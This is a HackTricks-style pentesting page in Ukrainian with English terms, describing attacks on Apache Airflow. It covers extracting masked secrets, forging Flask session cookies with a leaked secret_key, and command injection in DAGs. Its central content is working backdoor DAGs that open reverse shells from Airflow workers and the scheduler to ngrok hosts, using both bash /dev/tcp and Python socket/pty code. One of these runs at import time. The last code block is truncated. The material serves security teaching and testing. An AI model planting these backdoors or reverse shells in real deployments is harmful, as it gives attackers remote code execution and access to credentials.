# Apache Airflow Security

{{#include ../../banners/hacktricks-training.md}}

### Basic Information

[**Apache Airflow**](https://airflow.apache.org) слугує платформою для **орchestrating and scheduling data pipelines or workflows**. Термін "orchestration" у контексті data pipelines означає процес організації, координації та управління складними data workflows, що походять з різних джерел. Основна мета цих orchestrated data pipelines полягає в наданні оброблених і споживаних data sets. Ці data sets широко використовуються безліччю додатків, включаючи, але не обмежуючись, інструментами бізнес-аналітики, моделями data science та machine learning, які є основою функціонування big data applications.

В основному, Apache Airflow дозволить вам **schedule the execution of code when something** (event, cron) **happens**.

### Local Lab

#### Docker-Compose

Ви можете використовувати **docker-compose config file from** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) для запуску повного середовища apache airflow docker. (Якщо ви на MacOS, переконайтеся, що ви виділили принаймні 6 ГБ оперативної пам'яті для docker VM).

#### Minikube

Один із простих способів **run apache airflo**w - це запустити його **with minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Налаштування Airflow

Airflow може зберігати **чутливу інформацію** у своїй конфігурації або ви можете знайти слабкі конфігурації:

{{#ref}}
airflow-configuration.md
{{#endref}}

### RBAC Airflow

Перед початком атаки на Airflow ви повинні зрозуміти **як працюють дозволи**:

{{#ref}}
airflow-rbac.md
{{#endref}}

### Атаки

#### Перерахування веб-консолі

Якщо у вас є **доступ до веб-консолі**, ви можете отримати доступ до деякої або всієї наступної інформації:

- **Змінні** (Користувацька чутлива інформація може зберігатися тут)
- **З'єднання** (Користувацька чутлива інформація може зберігатися тут)
- Доступ до них за адресою `http://<airflow>/connection/list/`
- [**Конфігурація**](./#airflow-configuration) (Чутлива інформація, така як **`secret_key`** та паролі можуть зберігатися тут)
- Список **користувачів та ролей**
- **Код кожного DAG** (який може містити цікаву інформацію)

#### Отримання значень змінних

Змінні можуть зберігатися в Airflow, щоб **DAG** могли **отримувати** їх значення. Це схоже на секрети інших платформ. Якщо у вас є **достатні дозволи**, ви можете отримати доступ до них у GUI за адресою `http://<airflow>/variable/list/`.\
Airflow за замовчуванням покаже значення змінної в GUI, однак, відповідно до [**цього**](https://marclamberti.com/blog/variables-with-apache-airflow/), можливо встановити **список змінних**, значення яких з'являться як **зірочки** в **GUI**.

![](<../../images/image (164).png>)

Однак ці **значення** все ще можна **отримати** через **CLI** (вам потрібно мати доступ до БД), **виконання довільного DAG**, **API** для доступу до кінцевої точки змінних (API потрібно активувати) і **навіть сам GUI!**\
Щоб отримати ці значення з GUI, просто **виберіть змінні**, до яких ви хочете отримати доступ, і **натисніть на Дії -> Експортувати**.\
Інший спосіб - виконати **брутфорс** до **прихованого значення**, використовуючи **фільтрацію пошуку**, поки ви його не отримаєте:

![](<../../images/image (152).png>)

#### Підвищення привілеїв

Якщо конфігурація **`expose_config`** встановлена на **True**, з **ролі Користувач** і **вище** можуть **читати** **конфігурацію в вебі**. У цій конфігурації з'являється **`secret_key`**, що означає, що будь-який користувач з цим дійсним ключем може **створити свій власний підписаний cookie, щоб видавати себе за будь-який інший обліковий запис користувача**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG Backdoor (RCE in Airflow worker)

Якщо у вас є **доступ на запис** до місця, де **зберігаються DAG**, ви можете просто **створити один**, який надішле вам **зворотний шелл.**\
Зверніть увагу, що цей зворотний шелл буде виконуватись всередині **контейнера робітника Airflow**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG Backdoor (RCE in Airflow scheduler)

Якщо ви налаштуєте щось на **виконання в корені коду**, на момент написання цього тексту, це буде **виконано планувальником** через кілька секунд після розміщення його в папці DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### Створення DAG

Якщо вам вдасться **зламати машину всередині кластера DAG**, ви зможете створити нові **скрипти DAG** у папці `dags/`, і вони будуть **репліковані на решті машин** всередині кластера DAG.

#### Впровадження коду в DAG

Коли ви виконуєте DAG з GUI, ви можете **передавати аргументи** до нього.\
Отже, якщо DAG не правильно закодований, він може бути **вразливим до впровадження команд.**\
Саме це сталося в цьому CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Все, що вам потрібно знати, щоб **почати шукати впровадження команд у DAG**, це те, що **параметри** **доступні** за допомогою коду **`dag_run.conf.get("param_name")`**.

Більше того, та ж вразливість може виникнути з **змінними** (зверніть увагу, що з достатніми привілеями ви могли б **контролювати значення змінних** в GUI). Змінні **доступні за допомогою**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Якщо вони використовуються, наприклад, всередині команди bash, ви можете виконати ін'єкцію команди.

{{#include ../../banners/hacktricks-training.md}}
